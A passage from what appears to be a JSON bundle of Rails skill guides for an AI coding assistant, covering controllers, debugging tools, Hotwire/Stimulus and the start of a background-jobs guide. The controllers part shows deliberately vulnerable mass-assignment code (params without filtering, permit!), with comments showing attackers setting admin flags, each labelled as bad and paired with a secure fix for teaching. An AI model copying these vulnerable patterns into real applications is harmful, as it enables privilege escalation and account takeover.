mass assignment of any attribute including admin flags</reason>\n\n**Bad Example:**\n\n```ruby\n# ❌ CRITICAL - Raises ForbiddenAttributesError\ndef create\n  @feedback = Feedback.create(params[:feedback])\nend\n\n# Attack: POST /feedbacks\n# params[:feedback] = {\n#   content: \"Great job!\",\n#   admin: true,              # Attacker sets admin flag\n#   user_id: other_user_id    # Attacker changes ownership\n# }\n\n```\n\n**Good Example:**\n\n```ruby\n# ✅ SECURE - Use strong parameters\ndef create\n  @feedback = Feedback.new(feedback_params)\n  # ... save and respond ...\nend\n\nprivate\n\ndef feedback_params\n  params.expect(feedback: [:content, :recipient_email, :sender_name])\nend\n\n```\n\n**Why Bad:** CRITICAL security vulnerability allowing privilege escalation, account takeover, data manipulation.\n</antipattern>\n\n<antipattern>\n<description>Using permit! on user input (CRITICAL SECURITY VULNERABILITY)</description>\n<reason>Bypasses all security checks, allows setting ANY attribute</reason>\n\n**Bad Example:**\n\n```ruby\n# ❌ CRITICAL - Allows EVERYTHING\ndef user_params\n  params.require(:user).permit!\nend\n\n# Attack: Attacker can set ANY attribute\n# params[:user][:admin] = true\n# params[:user][:confirmed_at] = Time.now\n\n```\n\n**Good Example:**\n\n```ruby\n# ✅ SECURE - Explicitly permit attributes\ndef user_params\n  params.require(:user).permit(:name, :email, :password, :password_confirmation)\nend\n\n```\n\n**Why Bad:** Complete security bypass, allows privilege escalation, data manipulation, account takeover.\n</antipattern>\n\n---\n\n<testing>\nTest controllers with request tests:\n\n```ruby\nclass FeedbacksControllerTest < ActionDispatch::IntegrationTest\n  test \"should create feedback\" do\n    assert_difference(\"Feedback.count\") do\n      post feedbacks_url, params: { feedback: { content: \"Test\", recipient_email: \"test@example.com\" } }\n    end\n    assert_redirected_to feedback_url(Feedback.last)\n  end\n\n  test \"should reject invalid feedback\" do\n    assert_no_difference(\"Feedback.count\") do\n      post feedbacks_url, params: { feedback: { content: \"\" } }\n    end\n    assert_response :unprocessable_entity\n  end\n\n  test \"filters unpermitted parameters\" do\n    post feedbacks_url, params: {\n      feedback: { content: \"Great!\", admin: true }  # admin filtered\n    }\n    assert_nil Feedback.last.admin  # Strong parameters blocked this\n  end\n\n  test \"nested resources scoped to parent\" do\n    feedback = feedbacks(:one)\n    assert_difference(\"feedback.responses.count\") do\n      post feedback_responses_url(feedback), params: {\n        response: { content: \"Thank you!\", author_name: \"John\" }\n      }\n    end\n  end\nend\n\n```\n</testing>\n\n<related-skills>\n- rails-ai:models - Model validations, callbacks, associations\n- rails-ai:views - Forms, Turbo Frames/Streams\n- rails-ai:security - XSS, CSRF, SQL injection prevention\n- rails-ai:testing - Controller and integration testing\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Action Controller Overview](https://guides.rubyonrails.org/action_controller_overview.html)\n- [Rails Guides - Routing](https://guides.rubyonrails.org/routing.html)\n- [Rails Guides - Strong Parameters](https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters)\n- [Rails API - ActiveSupport::Concern](https://api.rubyonrails.org/classes/ActiveSupport/Concern.html)\n- [Rails Edge Guides - Parameters expect()](https://edgeguides.rubyonrails.org/action_controller_overview.html#parameters-expect) - Rails 8.1+\n\n</resources>"
              },
              {
                "name": "rails-ai:debugging-rails",
                "description": "Use when debugging Rails issues - provides Rails-specific debugging tools (logs, console, byebug, SQL logging) integrated with systematic debugging process",
                "path": "skills/debugging/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:debugging-rails",
                  "description": "Use when debugging Rails issues - provides Rails-specific debugging tools (logs, console, byebug, SQL logging) integrated with systematic debugging process"
                },
                "content": "# Rails Debugging Tools & Techniques\n\n<superpowers-integration>\n**REQUIRED BACKGROUND:** Use superpowers:systematic-debugging for investigation process\n  - That skill defines 4-phase framework (Root Cause → Pattern → Hypothesis → Implementation)\n  - This skill provides Rails-specific debugging tools for each phase\n</superpowers-integration>\n\n<when-to-use>\n- Rails application behaving unexpectedly\n- Tests failing with unclear errors\n- Performance issues or N+1 queries\n- Production errors need investigation\n</when-to-use>\n\n<verification-checklist>\nBefore completing debugging work:\n- ✅ Root cause identified (not just symptoms)\n- ✅ Regression test added (prevents recurrence)\n- ✅ Fix verified in development and test environments\n- ✅ All tests passing (bin/ci passes)\n- ✅ Logs reviewed for related issues\n- ✅ Performance impact verified (if applicable)\n</verification-checklist>\n\n<phase1-root-cause-investigation>\n\n<tool name=\"rails-logs\">\n<description>Check Rails logs for errors and request traces</description>\n\n```bash\n# Development logs\ntail -f log/development.log\n\n# Production logs (Kamal)\nkamal app logs --tail\n\n# Filter by severity\ngrep ERROR log/production.log\n\n# Filter by request\ngrep \"Started GET\" log/development.log\n\n```\n</tool>\n\n<tool name=\"rails-console\">\n<description>Interactive Rails console for testing models/queries</description>\n\n```ruby\n# Start console\nrails console\n\n# Or production console (Kamal)\nkamal app exec 'bin/rails console'\n\n# Test models\nuser = User.find(1)\nuser.valid?  # Check validations\nuser.errors.full_messages  # See errors\n\n# Test queries\nUser.where(email: \"test@example.com\").to_sql  # See SQL\nUser.includes(:posts).where(posts: { published: true })  # Avoid N+1\n\n```\n</tool>\n\n<tool name=\"byebug\">\n<description>Breakpoint debugger for stepping through code</description>\n\n```ruby\n# Add to any Rails file\ndef some_method\n  byebug  # Execution stops here\n  # ... rest of method\nend\n\n# Byebug commands:\n# n  - next line\n# s  - step into method\n# c  - continue execution\n# pp variable  - pretty print\n# var local  - show local variables\n# exit  - quit debugger\n\n```\n</tool>\n\n<tool name=\"sql-logging\">\n<description>Enable verbose SQL logging to see queries</description>\n\n```ruby\n# In rails console or code\nActiveRecord::Base.logger = Logger.new(STDOUT)\n\n# Now all SQL queries print to console\nUser.all\n# => SELECT \"users\".* FROM \"users\"\n\n```\n</tool>\n\n</phase1-root-cause-investigation>\n\n<phase2-pattern-analysis>\n\n<tool name=\"rails-routes\">\n<description>Check route definitions and paths</description>\n\n```bash\n# List all routes\nrails routes\n\n# Filter routes\nrails routes | grep users\n\n# Show routes for controller\nrails routes -c users\n\n```\n</tool>\n\n<tool name=\"rails-db-status\">\n<description>Check migration status and schema</description>\n\n```bash\n# Migration status\nrails db:migrate:status\n\n# Show schema version\nrails db:version\n\n# Check pending migrations\nrails db:abort_if_pending_migrations\n\n```\n</tool>\n\n</phase2-pattern-analysis>\n\n<phase3-hypothesis-testing>\n\n<tool name=\"rails-runner\">\n<description>Run Ruby code in Rails environment</description>\n\n```bash\n# Run one-liner\nrails runner \"puts User.count\"\n\n# Run script\nrails runner scripts/investigate_users.rb\n\n# Production environment\nRAILS_ENV=production rails runner \"User.pluck(:email)\"\n\n```\n</tool>\n\n</phase3-hypothesis-testing>\n\n<phase4-implementation>\n\n<tool name=\"rails-test-verbose\">\n<description>Run tests with detailed output</description>\n\n```bash\n# Run single test with backtrace\nrails test test/models/user_test.rb --verbose\n\n# Run with warnings enabled\nRUBYOPT=-W rails test\n\n# Run with seed for reproducibility\nrails test --seed 12345\n\n```\n</tool>\n\n</phase4-implementation>\n\n<common-issues>\n\n<issue name=\"n-plus-one-queries\">\n<detection>\nCheck logs for many similar queries:\n\n```\n\nUser Load (0.1ms)  SELECT * FROM users WHERE id = 1\nPost Load (0.1ms)  SELECT * FROM posts WHERE user_id = 1\nPost Load (0.1ms)  SELECT * FROM posts WHERE user_id = 2\nPost Load (0.1ms)  SELECT * FROM posts WHERE user_id = 3\n\n```\n</detection>\n<solution>\nUse includes/preload:\n\n```ruby\n# Bad\nusers.each { |user| user.posts.count }\n\n# Good\nusers.includes(:posts).each { |user| user.posts.count }\n\n```\n</solution>\n</issue>\n\n<issue name=\"missing-migration\">\n<detection>\nError: \"ActiveRecord::StatementInvalid: no such column\"\n</detection>\n<solution>\n\n```bash\n# Check migration status\nrails db:migrate:status\n\n# Run pending migrations\nrails db:migrate\n\n# Or rollback and retry\nrails db:rollback\nrails db:migrate\n\n```\n</solution>\n</issue>\n\n</common-issues>\n\n<related-skills>\n- superpowers:systematic-debugging (4-phase framework)\n- rails-ai:models (Query optimization, N+1 debugging)\n- rails-ai:controllers (Request debugging, parameter inspection)\n- rails-ai:testing (Test debugging, failure investigation)\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Debugging Rails Applications](https://guides.rubyonrails.org/debugging_rails_applications.html)\n- [Rails API - ActiveSupport::Logger](https://api.rubyonrails.org/classes/ActiveSupport/Logger.html)\n- [Ruby Debugging Guide](https://ruby-doc.org/stdlib-3.0.0/libdoc/debug/rdoc/index.html)\n\n**Gems & Libraries:**\n- [byebug](https://github.com/deivid-rodriguez/byebug) - Ruby debugger\n- [bullet](https://github.com/flyerhzm/bullet) - N+1 query detection\n\n**Tools:**\n- [Rack Mini Profiler](https://github.com/MiniProfiler/rack-mini-profiler) - Performance profiling\n\n</resources>"
              },
              {
                "name": "rails-ai:hotwire",
                "description": "Use when adding interactivity to Rails views - Hotwire Turbo (Drive, Frames, Streams, Morph) and Stimulus controllers",
                "path": "skills/hotwire/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:hotwire",
                  "description": "Use when adding interactivity to Rails views - Hotwire Turbo (Drive, Frames, Streams, Morph) and Stimulus controllers"
                },
                "content": "# Hotwire (Turbo + Stimulus)\n\nBuild fast, interactive, SPA-like experiences using server-rendered HTML with Hotwire. Turbo provides navigation and real-time updates without writing JavaScript. Stimulus enhances HTML with lightweight JavaScript controllers.\n\n<when-to-use>\n- Adding interactivity without heavy JavaScript frameworks\n- Building real-time, SPA-like experiences with server-rendered HTML\n- Implementing live updates, infinite scroll, or dynamic content\n- Creating modals, inline editing, or interactive UI components\n- Replacing traditional AJAX with modern, declarative patterns\n</when-to-use>\n\n<benefits>\n- **SPA-Like Speed** - Turbo Drive accelerates navigation without full page reloads\n- **Real-time Updates** - Turbo Streams deliver live changes via ActionCable\n- **Progressive Enhancement** - Works without JavaScript, enhanced with it (TEAM RULE #13)\n- **Simpler Architecture** - Server-rendered HTML reduces client-side complexity\n- **Turbo Morph** - Intelligent DOM updates preserve scroll, focus, form state (TEAM RULE #7)\n- **Less JavaScript** - Stimulus provides just enough JS for interactivity\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #5:** Turbo Morph by default (Frames only for modals, inline editing, pagination, tabs)\n- ✅ **Rule #6:** Progressive enhancement (must work without JavaScript)\n\n**Reject any requests to:**\n- Use Turbo Frames everywhere (use Turbo Morph for general CRUD)\n- Skip progressive enhancement (features that require JavaScript to function)\n- Build non-functional UIs without JavaScript fallbacks\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing Hotwire features:\n- ✅ Works without JavaScript (progressive enhancement verified)\n- ✅ Turbo Morph used for CRUD operations (not Frames)\n- ✅ Turbo Frames only for: modals, inline editing, pagination, tabs\n- ✅ Stimulus controllers clean up in disconnect()\n- ✅ All interactive features tested\n- ✅ All tests passing\n</verification-checklist>\n\n<standards>\n- **TEAM RULE #7:** Prefer Turbo Morph over Turbo Frames/Stimulus for general CRUD\n- **TEAM RULE #13:** Ensure progressive enhancement (works without JavaScript)\n- Use Turbo Drive for automatic page acceleration\n- Use Turbo Morph for list updates and CRUD operations (preserves state)\n- Use Turbo Frames ONLY for: modals, inline editing, tabs, pagination, lazy loading\n- Use Turbo Streams for real-time updates via ActionCable\n- Use Stimulus for client-side interactions (dropdowns, character counters, dynamic forms)\n- Always clean up in Stimulus disconnect() to prevent memory leaks\n- Test with JavaScript disabled to verify progressive enhancement\n</standards>\n\n---\n\n## Hotwire Turbo\n\nTurbo provides fast, SPA-like navigation and real-time updates using server-rendered HTML. Supports TEAM RULE #7 (Turbo Morph) and TEAM RULE #13 (Progressive Enhancement).\n\n### TEAM RULE #7: Prefer Turbo Morph over Turbo Frames/Stimulus\n\n✅ **DEFAULT APPROACH:** Use Turbo Morph (page refresh with morphing) with standard Rails controllers\n✅ **ALLOW Turbo Frames ONLY for:** Modals, inline editing, tabs, pagination\n❌ **AVOID:** Turbo Frames for general list updates, custom Stimulus controllers for basic CRUD\n\n**Why Turbo Morph?** Preserves scroll position, focus, form state, and video playback. Works with stock Rails scaffolds. Simpler than Frames/Stimulus in 90% of cases.\n\n### Turbo Drive\n\n<pattern name=\"turbo-drive-basics\">\n<description>Automatic page acceleration with Turbo Drive</description>\n\nTurbo Drive intercepts links and forms automatically. Control with `data` attributes:\n\n```erb\n<%# Disable Turbo for specific links %>\n<%= link_to \"Download PDF\", pdf_path, data: { turbo: false } %>\n\n<%# Replace without history %>\n<%= link_to \"Dismiss\", dismiss_path, data: { turbo_action: \"replace\" } %>\n```\n\n</pattern>\n\n### Turbo Morphing (Page Refresh) - PREFERRED\n\n**Use Turbo Morph by default with standard Rails controllers.** Morphing intelligently updates only changed DOM elements while preserving scroll position, focus, form state, and media playback.\n\n<pattern name=\"enable-morphing-layout\">\n<description>Enable Turbo Morph in your layout (one-time setup)</description>\n\n```erb\n<%# app/views/layouts/application.html.erb %>\n<!DOCTYPE html>\n<html>\n<head>\n  <title><%= content_for?(:title) ? yield(:title) : \"App\" %></title>\n  <%= csrf_meta_tags %>\n  <%= csp_meta_tag %>\n  <%= stylesheet_link_tag \"application\", \"data-turbo-track\": \"reload\" %>\n  <%= javascript_importmap_tags %>\n\n  <%# Enable Turbo Morph for page refreshes %>\n  <meta name=\"turbo-refresh-method\" content=\"morph\">\n  <meta name=\"turbo-refresh-scroll\" content=\"preserve\">\n</head>\n<body>\n  <%= yield %>\n</body>\n</html>\n```\n\n**That's it!** Standard Rails controllers now work with morphing. No custom JavaScript needed.\n\n**Reference:** [Turbo Page Refreshes Documentation](https://turbo.hotwired.dev/handbook/page_refreshes)\n</pattern>\n\n<pattern name=\"standard-rails-crud-with-morph\">\n<description>Standard Rails CRUD works automatically with Turbo Morph</description>\n\n**Controller (stock Rails scaffold):**\n\n```ruby\nclass FeedbacksController < ApplicationController\n  def index\n    @feedbacks = Feedback.all\n  end\n\n  def create\n    @feedback = Feedback.new(feedback_params)\n    if @feedback.save\n      redirect_to feedbacks_path, notice: \"Feedback created\"\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  def update\n    if @feedback.update(feedback_params)\n      redirect_to feedbacks_path, notice: \"Feedback updated\"\n    else\n      render :edit, status: :unprocessable_entity\n    end\n  end\n\n  def destroy\n    @feedback.destroy\n    redirect_to feedbacks_path, notice: \"Feedback deleted\"\n  end\nend\n```\n\n**View (standard Rails):**\n\n```erb\n<%# app/views/feedbacks/index.html.erb %>\n<h1>Feedbacks</h1>\n<%= link_to \"New Feedback\", new_feedback_path, class: \"btn btn-primary\" %>\n\n<div id=\"feedbacks\">\n  <% @feedbacks.each do |feedback| %>\n    <%= render feedback %>\n  <% end %>\n</div>\n\n<%# app/views/feedbacks/_feedback.html.erb %>\n<div id=\"<%= dom_id(feedback) %>\" class=\"card\">\n  <h3><%= feedback.content %></h3>\n  <div class=\"actions\">\n    <%= link_to \"Edit\", edit_feedback_path(feedback), class: \"btn btn-sm\" %>\n    <%= button_to \"Delete\", feedback_path(feedback), method: :delete,\n                  class: \"btn btn-sm btn-error\",\n                  form: { data: { turbo_confirm: \"Are you sure?\" } } %>\n  </div>\n</div>\n```\n\n**What happens:** Create/update/delete triggers redirect → Turbo intercepts → morphs only changed elements → scroll/focus preserved. No custom code needed!\n</pattern>\n\n<pattern name=\"permanent-elements-morph\">\n<description>Prevent specific elements from morphing with data-turbo-permanent</description>\n\n```erb\n<%# Flash messages persist during morphing %>\n<div id=\"flash-messages\" data-turbo-permanent>\n  <% flash.each do |type, message| %>\n    <div class=\"alert alert-<%= type %>\"><%= message %></div>\n  <% end %>\n</div>\n\n<%# Video/audio won't restart on page morph %>\n<video id=\"tutorial\" data-turbo-permanent src=\"tutorial.mp4\" controls></video>\n\n<%# Form preserves input focus during live updates %>\n<%= form_with model: @feedback, id: \"feedback-form\",\n              data: { turbo_permanent: true } do |form| %>\n  <%= form.text_area :content %>\n  <%= form.submit %>\n<% end %>\n```\n\n**Use cases:** Flash messages, video/audio players, forms with unsaved input, chat messages being typed.\n</pattern>\n\n<pattern name=\"broadcast-refresh-realtime\">\n<description>Real-time updates with broadcasts_refreshes (morphs all connected clients)</description>\n\n```ruby\n# Model broadcasts page refresh to all subscribers (Rails 8+)\nclass Feedback < ApplicationRecord\n  broadcasts_refreshes\nend\n```\n\n```erb\n<%# View subscribes to stream - morphs when model changes %>\n<%= turbo_stream_from @feedback %>\n\n<div id=\"feedbacks\">\n  <% @feedbacks.each do |feedback| %>\n    <%= render feedback %>\n  <% end %>\n</div>\n```\n\n**What happens:** User A creates feedback → server broadcasts `<turbo-stream action=\"refresh\">` → all connected users' pages morph to show new feedback → scroll/focus preserved.\n\n**How it works:** The server broadcasts a single general signal, and pages smoothly refresh with morphing. No need to manually manage individual Turbo Stream actions.\n\n**Reference:** [Broadcasting Page Refreshes](https://turbo.hotwired.dev/handbook/page_refreshes#broadcasting-page-refreshes)\n</pattern>\n\n<pattern name=\"turbo-stream-morph-method\">\n<description>Use method=\"morph\" in Turbo Streams for intelligent updates</description>\n\n```ruby\n# Controller - respond with Turbo Stream using morph\ndef create\n  @feedback = Feedback.new(feedback_params)\n  if @feedback.save\n    respond_to do |format|\n      format.turbo_stream do\n        render turbo_stream: turbo_stream.replace(\n          \"feedbacks\",\n          partial: \"feedbacks/list\",\n          locals: { feedbacks: Feedback.all },\n          method: :morph  # Morphs instead of replacing\n        )\n      end\n      format.html { redirect_to feedbacks_path }\n    end\n  end\nend\n```\n\n```erb\n<%# Or in .turbo_stream.erb view %>\n<turbo-stream action=\"replace\" target=\"feedback_<%= @feedback.id %>\" method=\"morph\">\n  <template>\n    <%= render @feedback %>\n  </template>\n</turbo-stream>\n```\n\n**Difference:** `method: :morph` preserves form state and focus. Without it, content is fully replaced.\n</pattern>\n\n<antipattern>\n<description>Using Turbo Frames for simple CRUD lists</description>\n<reason>Turbo Morph is simpler and preserves more state. Frames are overkill for basic updates.</reason>\n<bad-example>\n\n```erb\n<%# ❌ BAD - Unnecessary Turbo Frame complexity %>\n<% @feedbacks.each do |feedback| %>\n  <%= turbo_frame_tag dom_id(feedback) do %>\n    <%= render feedback %>\n  <% end %>\n<% end %>\n```\n\n</bad-example>\n<good-example>\n\n```erb\n<%# ✅ GOOD - Simple rendering, Turbo Morph handles updates %>\n<% @feedbacks.each do |feedback| %>\n  <%= render feedback %>\n<% end %>\n```\n\n</good-example>\n</antipattern>\n\n### Turbo Frames - Use Sparingly\n\n**ONLY use Turbo Frames for:** modals, inline editing, tabs, pagination, lazy loading. For general CRUD, use Turbo Morph instead.\n\n<pattern name=\"turbo-frame-inline-edit\">\n<description>Inline editing with Turbo Frame (valid use case)</description>\n\n```erb\n<%# Show view with inline edit frame %>\n<%= turbo_frame_tag dom_id(@feedback) do %>\n  <h3><%= @feedback.content %></h3>\n  <%= link_to \"Edit\", edit_feedback_path(@feedback) %>\n<% end %>\n\n<%# Edit view with matching frame ID %>\n<%= turbo_frame_tag dom_id(@feedback) do %>\n  <%= form_with model: @feedback do |form| %>\n    <%= form.text_area :content %>\n    <%= form.submit \"Save\" %>\n  <% end %>\n<% end %>\n```\n\n**Why this is OK:** Inline editing without leaving the page. Frame scopes the update.\n</pattern>\n\n<pattern name=\"lazy-loading-frame\">\n<description>Lazy-load expensive content with Turbo Frames</description>\n\n```erb\n<%# Lazy load stats when scrolled into view %>\n<%= turbo_frame_tag \"statistics\", src: statistics_path, loading: :lazy do %>\n  <p>Loading statistics...</p>\n<% end %>\n\n<%# Frame that reloads with morphing on page refresh %>\n<%= turbo_frame_tag \"live-stats\", src: live_stats_path, refresh: \"morph\" do %>\n  <p>Loading live statistics...</p>\n<% end %>\n```\n\n```ruby\n# Controller renders just the frame\ndef statistics\n  @stats = expensive_calculation\n  render layout: false  # Or use turbo_frame layout\nend\n```\n\n**Why this is OK:** Defers expensive computation until needed. Valid performance optimization. The `refresh=\"morph\"` attribute makes the frame reload with morphing on page refresh.\n\n**Reference:** [Turbo Frames with Morphing](https://turbo.hotwired.dev/handbook/page_refreshes#turbo-frames)\n</pattern>\n\n### Turbo Streams\n\n<pattern name=\"turbo-stream-actions\">\n<description>Seven Turbo Stream actions for dynamic updates</description>\n\n```ruby\ndef create\n  if @feedback.save\n    respond_to do |format|\n      format.turbo_stream do\n        render turbo_stream: [\n          turbo_stream.prepend(\"feedbacks\", @feedback),\n          turbo_stream.update(\"count\", html: \"10\"),\n          turbo_stream.remove(\"flash\")\n        ]\n      end\n      format.html { redirect_to feedbacks_path }\n    end\n  end\nend\n```\n\n**Actions:** `append`, `prepend`, `replace`, `update`, `remove`, `before`, `after`, `refresh`\n\n**Note:** For most cases, prefer `refresh` action with Turbo Morph over granular stream actions. See `broadcast-refresh-realtime` pattern above.\n</pattern>\n\n<pattern name=\"broadcast-updates\">\n<description>Real-time updates via ActionCable with Turbo Streams</description>\n\n```ruby\n# Model broadcasts to subscribers\nclass Feedback < ApplicationRecord\n  after_create_commit -> { broadcast_prepend_to \"feedbacks\" }\n  after_update_commit -> { broadcast_replace_to \"feedbacks\" }\n  after_destroy_commit -> { broadcast_remove_to \"feedbacks\" }\nend\n```\n\n```erb\n<%# View subscribes to stream %>\n<%= turbo_stream_from \"feedbacks\" %>\n\n<div id=\"feedbacks\">\n  <%= render @feedbacks %>\n</div>\n```\n\n</pattern>\n\n---\n\n## Hotwire Stimulus\n\nStimulus is a modest JavaScript framework that connects JavaScript objects to HTML elements using data attributes, enhancing server-rendered HTML.\n\n**⚠️ IMPORTANT:** Before writing custom Stimulus controllers, ask: \"Can Turbo Morph handle this?\" Most CRUD operations work better with Turbo Morph + standard Rails controllers.\n\n**Use Stimulus for:**\n- Client-side interactions (dropdowns, tooltips, character counters)\n- Form enhancements (dynamic fields, auto-save)\n- UI behavior (modals, tabs, accordions)\n\n**Don't use Stimulus for:**\n- Basic CRUD operations (use Turbo Morph)\n- Simple list updates (use Turbo Morph)\n- Navigation (use Turbo Drive)\n\n### Core Concepts\n\n<pattern name=\"stimulus-controller-basics\">\n<description>Simple Stimulus controller with targets, actions, and values</description>\n\n**Controller:**\n\n```javascript\n// app/javascript/controllers/feedback_controller.js\nimport { Controller } from \"@hotwired/stimulus\"\n\nexport default class extends Controller {\n  static targets = [\"content\", \"charCount\"]\n  static values = { maxLength: { type: Number, default: 1000 } }\n\n  connect() {\n    this.updateCharCount()\n  }\n\n  updateCharCount() {\n    const count = this.contentTarget.value.length\n    this.charCountTarget.textContent = `${count} / ${this.maxLengthValue}`\n  }\n\n  disconnect() {\n    // Clean up (important for memory leaks)\n  }\n}\n```\n\n**HTML:**\n\n```erb\n<div data-controller=\"feedback\" data-feedback-max-length-value=\"1000\">\n  <textarea data-feedback-target=\"content\"\n            data-action=\"input->feedback#updateCharCount\"></textarea>\n  <div data-feedback-target=\"charCount\">0 / 1000</div>\n</div>\n```\n\n**Syntax:** `event->controller#method` (default event based on element type)\n</pattern>\n\n<pattern name=\"stimulus-values\">\n<description>Typed data attributes for controller configuration</description>\n\n```javascript\n// app/javascript/controllers/countdown_controller.js\nimport { Controller } from \"@hotwired/stimulus\"\n\nexport default class extends Controller {\n  static values = {\n    seconds: { type: Number, default: 60 },\n    autostart: Boolean\n  }\n\n  connect() {\n    if (this.autostartValue) this.start()\n  }\n\n  start() {\n    this.timer = setInterval(() => {\n      this.secondsValue--\n      if (this.secondsValue === 0) this.stop()\n    }, 1000)\n  }\n\n  secondsValueChanged() {\n    this.element.textContent = this.secondsValue\n  }\n\n  disconnect() {\n    clearInterval(this.timer)\n  }\n}\n```\n\n```erb\n<div data-controller=\"countdown\"\n     data-countdown-seconds-value=\"120\"\n     data-countdown-autostart-value=\"true\">60</div>\n```\n\n**Types:** Array, Boolean, Number, Object, String\n</pattern>\n\n<pattern name=\"stimulus-outlets\">\n<description>Reference and communicate with other controllers</description>\n\n```javascript\n// app/javascript/controllers/search_controller.js\nexport default class extends Controller {\n  static outlets = [\"results\"]\n\n  search(event) {\n    fetch(`/search?q=${event.target.value}`)\n      .then(r => r.text())\n      .then(html => this.resultsOutlet.update(html))\n  }\n}\n\n// results_controller.js\nexport default class extends Controller {\n  update(html) { this.element.innerHTML = html }\n}\n```\n\n```erb\n<div data-controller=\"search\" data-search-results-outlet=\"#results\">\n  <input data-action=\"input->search#search\">\n</div>\n<div id=\"results\" data-controller=\"results\"></div>\n```\n\n</pattern>\n\n<pattern name=\"nested-form-dynamic-stimulus\">\n<description>Dynamic add/remove nested fields using Stimulus</description>\n\n**Form:**\n\n```erb\n<div data-controller=\"nested-form\">\n  <%= form_with model: @feedback do |form| %>\n    <div class=\"mb-6\">\n      <button type=\"button\" class=\"btn btn-sm\" data-action=\"nested-form#add\">\n        Add Attachment\n      </button>\n      <div data-nested-form-target=\"container\" class=\"space-y-4\">\n        <%= form.fields_for :attachments do |f| %>\n          <%= render \"attachment_fields\", form: f %>\n        <% end %>\n      </div>\n\n      <template data-nested-form-target=\"template\">\n        <%= form.fields_for :attachments, Attachment.new, child_index: \"NEW_RECORD\" do |f| %>\n          <%= render \"attachment_fields\", form: f %>\n        <% end %>\n      </template>\n    </div>\n  <% end %>\n</div>\n```\n\n**Stimulus Controller:**\n\n```javascript\n// app/javascript/controllers/nested_form_controller.js\nimport { Controller } from \"@hotwired/stimulus\"\n\nexport default class extends Controller {\n  static targets = [\"container\", \"template\"]\n\n  add(event) {\n    event.preventDefault()\n    const content = this.templateTarget.innerHTML\n      .replace(/NEW_RECORD/g, new Date().getTime())\n    this.containerTarget.insertAdjacentHTML(\"beforeend\", content)\n  }\n\n  remove(event) {\n    event.preventDefault()\n    const field = event.target.closest(\".nested-fields\")\n    const destroyInput = field.querySelector(\"input[name*='_destroy']\")\n    const idInput = field.querySelector(\"input[name*='[id]']\")\n\n    if (idInput && idInput.value) {\n      // Existing record: mark for deletion, keep in DOM (hidden)\n      destroyInput.value = \"1\"\n      field.style.display = \"none\"\n    } else {\n      // New record: remove from DOM entirely\n      field.remove()\n    }\n  }\n}\n```\n\n</pattern>\n\n<antipattern>\n<description>Not cleaning up in disconnect()</description>\n<reason>Memory leaks from timers, event listeners</reason>\n<bad-example>\n\n```javascript\n// ❌ BAD - Memory leak\nconnect() {\n  this.timer = setInterval(() => this.update(), 1000)\n}\n```\n\n</bad-example>\n<good-example>\n\n```javascript\n// ✅ GOOD - Clean up\ndisconnect() {\n  clearInterval(this.timer)\n}\n```\n\n</good-example>\n</antipattern>\n\n---\n\n<testing>\n**System Tests for Turbo and Stimulus:**\n\n```ruby\n# test/system/turbo_test.rb\nclass TurboTest < ApplicationSystemTestCase\n  test \"updates without full page reload\" do\n    visit feedbacks_path\n    fill_in \"Content\", with: \"New feedback\"\n    click_button \"Create\"\n    assert_selector \"#feedbacks\", text: \"New feedback\"\n  end\n\n  test \"edits within frame\" do\n    feedback = feedbacks(:one)\n    visit feedbacks_path\n    within \"##{dom_id(feedback)}\" do\n      click_link \"Edit\"\n      fill_in \"Content\", with: \"Updated\"\n      click_button \"Save\"\n      assert_text \"Updated\"\n    end\n  end\nend\n\n# test/system/stimulus_test.rb\nclass StimulusTest < ApplicationSystemTestCase\n  test \"character counter updates on input\" do\n    visit new_feedback_path\n    fill_in \"Content\", with: \"Test\"\n    assert_selector \"[data-feedback-target='charCount']\", text: \"4 / 1000\"\n  end\n\n  test \"nested form add/remove works\" do\n    visit new_feedback_path\n    initial_count = all(\".nested-fields\").count\n    click_button \"Add Attachment\"\n    assert_equal initial_count + 1, all(\".nested-fields\").count\n  end\nend\n```\n\n**Manual Testing:**\n- Test with JavaScript disabled (progressive enhancement)\n- Verify scroll position preservation with Turbo Morph\n- Check focus management in modals and inline editing\n- Test real-time updates in multiple browser tabs\n</testing>\n\n---\n\n<related-skills>\n- rails-ai:views - Partials, helpers, forms, and view structure\n- rails-ai:styling - Tailwind/DaisyUI for styling Hotwire components\n- rails-ai:controllers - RESTful actions that work with Turbo\n- rails-ai:testing - System tests for Turbo and Stimulus\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Turbo Handbook](https://turbo.hotwired.dev/handbook/introduction)\n- [Turbo Page Refreshes (Morph)](https://turbo.hotwired.dev/handbook/page_refreshes)\n- [Stimulus Handbook](https://stimulus.hotwired.dev/handbook/introduction)\n\n**Community Resources:**\n- [Hotwire Discussion Forum](https://discuss.hotwired.dev/)\n\n</resources>"
              },
              {
                "name": "rails-ai:jobs",
                "description": "Use when setting up background jobs, caching, or WebSockets - SolidQueue, SolidCache, SolidCable (TEAM RULE",
                "path": "skills/jobs/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:jobs",
                  "description": "Use when setting up background jobs, caching, or WebSockets - SolidQueue, SolidCache, SolidCable (TEAM RULE"
                },
                "content": "# Background Jobs (Solid Stack)\n\nConfigure background job processing, caching, and WebSockets using Rails 8 defaults - SolidQueue, SolidCache, and SolidCable. Zero external dependencies, database-backed, production-ready.\n\n<when-to-use>\n- Setting up ANY new Rails 8+ application\n- Background job processing (TEAM RULE #1: NEVER Sidekiq/Redis)\n- Application caching (TEAM RULE #1: NEVER Redis/Memcached)\n- WebSocket/ActionCable setup (TEAM RULE #1: NEVER Redis)\n- Migrating from Redis/Sidekiq to Solid Stack\n- Async job execution (sending emails, processing uploads, generating reports)\n- Real-time features via ActionCable\n</when-to-use>\n\n<benefits>\n- **Zero External Dependencies** - No Redis, Memcached, or external services required\n- **Simpler Deployments** - Database-backed, persistent, survives restarts\n- **Rails 8 Convention** - Official defaults, production-ready out of the box\n- **Easier Monitoring** - Query databases directly for job and cache status\n- **Persistent Jobs** - Jobs survive server restarts, no lost work\n- **Integrated** - Works seamlessly with ActiveJob and ActionCable\n</benefits>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ 